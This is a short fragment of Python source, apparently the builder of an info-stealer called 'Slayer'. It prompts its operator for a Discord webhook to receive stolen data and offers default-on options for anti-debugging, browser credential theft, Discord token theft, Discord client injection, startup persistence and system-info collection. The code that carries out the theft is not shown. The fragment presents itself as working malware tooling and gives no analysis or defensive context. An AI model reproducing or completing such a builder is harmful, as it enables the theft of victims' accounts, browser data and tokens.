    ...
    questions = [
        {
            "type": "input",
            "name": "webhook",
            "message": "[Slayer] Enter your webhook URL",
            "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
        },
        {
            "type": "confirm",
            "name": "antidebug",
            "message": "[Slayer] Enable anti-debugging?",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "browsers",
            "message": "[Slayer] Enable browser stealing?",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "discordtoken",
            "message": "[Slayer] Enable Discord token stealing?",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "injection",
            "message": "[Slayer] Enable Discord injection?",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "startup",
            "message": "[Slayer] Enable startup?",
            "default": True,
        },
        {
            "type": "confirm",
            "name": "systeminfo",
            "message": "[Slayer] Enable system info?",
            "default": True,
        },
    ]
